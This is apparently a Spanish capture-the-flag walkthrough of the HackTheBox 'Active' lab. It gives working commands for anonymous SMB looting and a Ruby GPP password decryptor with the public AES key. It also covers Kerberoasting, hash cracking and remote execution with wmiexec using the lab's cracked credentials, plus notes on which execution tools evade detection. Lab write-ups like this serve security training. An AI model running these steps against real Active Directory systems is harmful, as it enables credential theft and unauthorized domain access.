<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>M0B notes</title>
  <meta name="description" content="&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient //10.10.10.100/Replication &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link rel="icon" href="/M0B.png" type="image/png">
  <style>
    /* fallback si la hoja no carga */
    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
  </style>
  
  <script defer src="/assets/js/copy-code.js"></script>
</head>
<body>
  <header class="site-header">
    <div class="site-brand">
      <img class="brand-logo" src="/M0B.png" alt="logo" />
      <div class="brand-title">M0B notes</div>
    </div>
    <nav class="site-nav">
      <a href="/">Inicio</a>
      <a href="/puertos/">Puertos</a>
      <a href="/escalada/">Escalada</a>
      <a href="/portswigger/">Portswigger</a>
      <a href="/hackthebox/">HackTheBox</a>
      <a href="/real_life/">Real Life</a>
      <a href="/extras/">Extras</a>
    </nav>
  </header>

  <main>
    <div class="container">
      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.10.100/Replication <span class="nt">-N</span>
</code></pre></div></div>

<p>Para descargar una carpeta de forma recursiva en smb:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> mask <span class="s2">""</span>
smb: <span class="se">\&gt;</span> prompt OFF
smb: <span class="se">\&gt;</span> recurse ON
smb: <span class="se">\&gt;</span> mget <span class="k">*</span>
</code></pre></div></div>

<p>El archivo <code class="language-plaintext highlighter-rouge">groups.xml</code></p>

<p>Suele contener credenciales</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
</code></pre></div></div>

<p>Esta contraseña encriptada se conoce como una <strong>contraseña de preferencias de política de grupo (GPP)</strong>. Microsoft usó una clave simétrica para encriptar estas contraseñas, y la <strong>clave</strong> fue <strong>revelada públicamente</strong>.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/ruby</span>
<span class="nb">require</span> <span class="s1">'rubygems'</span>
<span class="nb">require</span> <span class="s1">'openssl'</span>
<span class="nb">require</span> <span class="s1">'base64'</span>

<span class="k">unless</span> <span class="no">ARGV</span><span class="p">.</span><span class="nf">length</span> <span class="o">==</span> <span class="mi">1</span>
  <span class="nb">puts</span> <span class="s2">"Usage: </span><span class="si">#{</span><span class="no">File</span><span class="p">.</span><span class="nf">basename</span><span class="p">(</span><span class="vg">$0</span><span class="p">)</span><span class="si">}</span><span class="s2">: encrypted_data"</span>
  <span class="nb">exit</span>
<span class="k">end</span>

<span class="n">encrypted_data</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

<span class="c1">#encrypted_data = "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s2">"="</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="p">(</span><span class="n">encrypted_data</span><span class="p">.</span><span class="nf">length</span> <span class="o">%</span> <span class="mi">4</span><span class="p">))</span>
<span class="n">epassword</span> <span class="o">=</span> <span class="s2">"</span><span class="si">#{</span><span class="n">encrypted_data</span><span class="si">}#{</span><span class="n">padding</span><span class="si">}</span><span class="s2">"</span>
<span class="n">decoded</span> <span class="o">=</span> <span class="no">Base64</span><span class="p">.</span><span class="nf">decode64</span><span class="p">(</span><span class="n">epassword</span><span class="p">)</span>

<span class="n">key</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b</span><span class="s2">"</span>
<span class="n">aes</span> <span class="o">=</span> <span class="no">OpenSSL</span><span class="o">::</span><span class="no">Cipher</span><span class="o">::</span><span class="no">Cipher</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"AES-256-CBC"</span><span class="p">)</span>
<span class="n">aes</span><span class="p">.</span><span class="nf">decrypt</span>
<span class="n">aes</span><span class="p">.</span><span class="nf">key</span> <span class="o">=</span> <span class="n">key</span>
<span class="n">plaintext</span> <span class="o">=</span> <span class="n">aes</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span>
<span class="n">plaintext</span> <span class="o">&lt;&lt;</span> <span class="n">aes</span><span class="p">.</span><span class="nf">final</span>
<span class="n">pass</span> <span class="o">=</span> <span class="n">plaintext</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="s1">'v*'</span><span class="p">).</span><span class="nf">pack</span><span class="p">(</span><span class="s1">'C*'</span><span class="p">)</span> <span class="c1">## UNICODE conversion</span>

<span class="k">return</span> <span class="n">pass</span>
<span class="k">end</span>

<span class="n">blah</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
<span class="nb">puts</span> <span class="n">blah</span>
</code></pre></div></div>

<p>Luego hacemos kerberoasting con las creds obtenidas:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">GetUserSPNs</span><span class="p">.</span><span class="n">py</span> <span class="sh">'</span><span class="s">active.htb/SVC_TGS:GPPstillStandingStrong2k18</span><span class="sh">'</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.100</span> <span class="o">-</span><span class="n">request</span>
</code></pre></div></div>

<p>Se obtiene el hash del administrador y se rompe por fuerza bruta</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash</span>
</code></pre></div></div>

<p>No podemos conectarnos con evil-winrm, pero netexec nos tira pwned:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'Ticketmaster1968'</span> <span class="nt">-d</span> active.htb
</code></pre></div></div>

<p>Asi que</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wmiexec</span><span class="p">.</span><span class="n">py</span> <span class="sh">'</span><span class="s">Administrator:Ticketmaster1968@10.10.10.100</span><span class="sh">'</span>
</code></pre></div></div>

<ul>
  <li>
    <p><strong>psexec.py</strong> es una herramienta poderosa que permite la ejecución de comandos con privilegios de SYSTEM, pero deja rastros evidentes en el sistema remoto, como la creación de un binario y un servicio. Sin embargo, realiza una limpieza automática si la sesión se cierra correctamente, lo que puede ayudar a minimizar su huella.</p>
  </li>
  <li>
    <p><strong>smbexec.py</strong>, por otro lado, no crea un binario, lo que puede hacerla menos detectable. Sin embargo, al igual que psexec.py, crea un servicio en el sistema remoto. Aunque realiza una limpieza automática, si el comando falla antes de la limpieza, los archivos no se eliminarán, dejando artefactos en el sistema remoto. Además, smbexec.py tiene la limitación de que solo puede utilizar rutas absolutas. Esto significa que todos los comandos deben especificar la ruta completa al archivo o directorio que quieren acceder, lo que puede ser un inconveniente en algunos casos.</p>
  </li>
  <li>
    <p><strong>wmiexec.py</strong> no crea un binario ni un servicio, lo que la hace menos detectable que las otras dos herramientas. Sin embargo, requiere acceso de escritura al recurso compartido ADMIN$, lo que puede limitar su utilidad en algunos escenarios. Además, a diferencia de las otras dos herramientas, wmiexec.py proporciona acceso como Administrator en lugar de SYSTEM.</p>
  </li>
</ul>

      <div class="footer">
        <span class="muted">© 2025 · Generado con Jekyll</span>
      </div>
    </div>
  </main>
</body>
</html>

